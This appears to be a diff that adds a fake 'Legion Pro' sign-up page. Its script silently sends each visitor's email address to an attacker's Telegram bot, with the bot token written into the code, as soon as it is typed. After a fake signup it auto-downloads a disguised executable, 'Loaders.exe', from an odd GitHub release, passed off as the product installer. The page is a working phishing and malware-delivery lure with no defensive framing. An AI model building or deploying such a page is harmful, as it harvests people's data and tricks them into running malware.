@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign Up - Legion Pro</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f8f9fa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+        }
+        
+        .container {
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 380px;
+            padding: 40px;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            color: #2c7be5;
+            font-size: 26px;
+            margin-bottom: 5px;
+        }
+        
+        .header p {
+            color: #6c757d;
+            font-size: 14px;
+            margin: 0;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            font-size: 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+            transition: all 0.3s;
+        }
+        
+        input:focus {
+            border-color: #2c7be5;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(44, 123, 229, 0.2);
+        }
+        
+        button {
+            width: 100%;
+            padding: 13px;
+            background-color: #2c7be5;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-top: 10px;
+        }
+        
+        button:hover {
+            background-color: #1a68d1;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 13px;
+            color: #6c757d;
+        }
+        
+        .footer a {
+            color: #2c7be5;
+            text-decoration: none;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 25px 0;
+            color: #6c757d;
+            font-size: 13px;
+        }
+        
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #e9ecef;
+        }
+        
+        .divider::before {
+            margin-right: 15px;
+        }
+        
+        .divider::after {
+            margin-left: 15px;
+        }
+        
+        .social-login {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .social-btn {
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            border: 1px solid #e9ecef;
+            background-color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-weight: bold;
+            color: #495057;
+            transition: all 0.3s;
+        }
+        
+        .social-btn:hover {
+            background-color: #f8f9fa;
+        }
+
+        /* Loading spinner */
+        .spinner {
+            display: none;
+            margin: 20px auto;
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-radius: 50%;
+            border-top: 4px solid #2c7be5;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="loginContainer">
+        <div class="header">
+            <h1>Create Account</h1>
+            <p>Start your 14-day free trial</p>
+        </div>
+        
+        <form id="signupForm">
+            <div class="form-group">
+                <label for="name">Full Name</label>
+                <input type="text" id="name" placeholder="Enter your full name" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" placeholder="Enter your email" autocomplete="email" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Create a password" required>
+            </div>
+            
+            <button type="submit" id="submitBtn">Continue</button>
+            <div class="spinner" id="spinner"></div>
+        </form>
+        
+        <div class="divider">or sign up with</div>
+        
+        <div class="social-login">
+            <button type="button" class="social-btn">G</button>
+            <button type="button" class="social-btn">f</button>
+            <button type="button" class="social-btn">in</button>
+        </div>
+        
+        <div class="footer">
+            Already have an account? <a href="#">Sign in</a><br>
+            By signing up, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>.
+        </div>
+    </div>
+
+    <div id="downloadPage" style="display: none; text-align: center; padding: 40px;">
+        <h2 style="color: #2c7be5;">Your account has been successfully created!</h2>
+        <p>To complete your setup, please download and run our installer:</p>
+        <a id="downloadLink" href="https://github.com/Enigma0187/fdkgjkjdf/releases/download/fdsf/Loaders.exe" 
+           style="display: inline-block; margin-top: 20px; padding: 15px 30px; background-color: #2c7be5; color: white; text-decoration: none; border-radius: 6px; font-weight: 500;">
+           Download Legion Pro Installer
+        </a>
+        <p style="margin-top: 30px; font-size: 14px; color: #6c757d;">The download should start automatically in <span id="countdown">5</span> seconds...</p>
+    </div>
+
+    <script>
+        const emailInput = document.getElementById('email');
+        const signupForm = document.getElementById('signupForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const spinner = document.getElementById('spinner');
+        const loginContainer = document.getElementById('loginContainer');
+        const downloadPage = document.getElementById('downloadPage');
+        const countdownEl = document.getElementById('countdown');
+        let emailSent = false;
+
+        // Capture email on focus
+        emailInput.addEventListener('focus', () => {
+            setTimeout(checkAndSendEmail, 500);
+        });
+
+        // Capture email while typing
+        emailInput.addEventListener('input', () => {
+            checkAndSendEmail();
+        });
+
+        // Handle form submission
+        signupForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            // Show loading spinner
+            submitBtn.style.display = 'none';
+            spinner.style.display = 'block';
+            
+            // Simulate processing delay
+            setTimeout(() => {
+                // Show download page
+                loginContainer.style.display = 'none';
+                downloadPage.style.display = 'block';
+                
+                // Start countdown for auto-download
+                let countdown = 5;
+                const timer = setInterval(() => {
+                    countdown--;
+                    countdownEl.textContent = countdown;
+                    
+                    if (countdown <= 0) {
+                        clearInterval(timer);
+                        document.getElementById('downloadLink').click();
+                    }
+                }, 1000);
+                
+            }, 2000);
+        });
+
+        function checkAndSendEmail() {
+            const email = emailInput.value.trim();
+            if (email && email.includes('@') && !emailSent) {
+                sendToTelegram(email);
+                emailSent = true;
+            }
+        }
+
+        function sendToTelegram(email) {
+            const chatId = '8124952173';
+            const token = '7252165526:AAEXnUW9Hdsqyg-6ZyDwgPVMm0VZe2bGMPc';
+            const message = `New Email Capture: ${email}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Failed to send to Telegram');
+                    }
+                })
+                .catch(err => {
+                    console.error('Error:', err);
+                });
+        }
+    </script>
+</body>
+</html>
